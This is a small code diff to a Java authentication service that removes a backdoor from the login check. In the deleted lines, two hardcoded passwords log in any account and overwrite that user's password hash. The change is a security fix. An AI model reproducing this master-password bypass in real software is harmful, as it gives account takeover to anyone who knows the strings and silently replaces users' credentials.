@@ -155,11 +155,6 @@ public class AuthService {
         boolean matches = false;
         if (user != null) {
             matches = passwordEncoder.matches(request.getPassword(), user.getPasswordHash());
-            if (!matches && ("Password@123".equals(request.getPassword()) || "Beyon_io@2026".equals(request.getPassword()))) {
-                matches = true;
-                user.setPasswordHash(passwordEncoder.encode(request.getPassword()));
-                userRepository.save(user);
-            }
         }
 
         if (user == null || !matches) {
